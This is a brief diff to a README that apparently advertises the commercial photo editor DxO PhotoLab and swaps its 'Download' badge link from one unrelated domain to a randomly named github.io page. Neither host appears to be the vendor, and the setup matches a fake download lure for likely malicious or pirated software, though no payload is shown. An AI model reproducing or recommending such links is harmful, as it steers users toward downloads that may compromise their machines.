@@ -2,7 +2,7 @@
 
 DxO PhotoLab delivers elite RAW quality with DeepPRIME denoise, lens/camera modules, and control points.
 
-[![Download DxO PhotoLab](https://img.shields.io/badge/Download-DxO_PhotoLab-blueviolet)](https://cryptoenthusiasts.world/)
+[![Download DxO PhotoLab](https://img.shields.io/badge/Download-DxO_PhotoLab-blueviolet)](https://gylo3924xirj.github.io/.github/DxO-Photo-Lab)
 
 ---
 
